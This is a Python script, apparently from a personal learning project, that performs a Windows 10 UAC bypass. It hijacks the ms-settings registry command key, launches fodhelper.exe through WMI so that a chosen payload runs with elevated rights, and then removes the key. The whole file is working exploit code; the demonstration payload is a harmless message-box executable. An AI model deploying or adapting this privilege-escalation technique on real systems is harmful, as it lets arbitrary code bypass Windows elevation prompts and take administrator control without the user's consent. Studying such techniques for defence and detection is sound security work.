"""
Works from: Windows 10 TH1 (10240)
Fixed in: unfixed
Tested and Doesnot works in windows 8.1(no fodhelper in it)
"""
import os
import wmi
import time
import winreg

wmi = wmi.WMI()

def fodhelper(payload):
	print("Hijacking Software\\Classes\\ms-settings\\shell\\open\\command")
	try:
		key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\ms-settings\shell\open\command"))
		winreg.SetValueEx(key,None,0,winreg.REG_SZ,payload)
		winreg.SetValueEx(key,"DelegateExecute",0,winreg.REG_SZ,None)
		winreg.CloseKey(key)
	except Exception as error:
		print("Unable to create Default and DelegateExecute key")
	else:
		print("Successfully created Default and DelegateExecute key")

	print("Pausing for 5 seconds before executing")
	time.sleep(5)

	print("Attempting to create process (cmd.exe /c start fodhelper.exe)")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start fodhelper.exe",ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
		if (result[1] == 0):
			print("Process started successfully (cmd.exe /c start fodhelper.exe)")
		else:
			print("Problem creating process (cmd.exe /c start fodhelper.exe)")
	except Exception as error:
		print("Problem creating process (cmd.exe /c start fodhelper.exe)")
	
	print("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print("Attempting to delete and restore hijacked registry keys")
	try:
		winreg.DeleteKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\ms-settings\shell\open\command"))
	except Exception as error:
		print("Unable to clean")
	else:
		print("Successfully, our payload ({}) should now run elevated".format(payload))

payload="C:\\Users\\vipul\\Desktop\\learning\\winpawnpython3\\payloads\\MessageBox.exe"
fodhelper(payload)
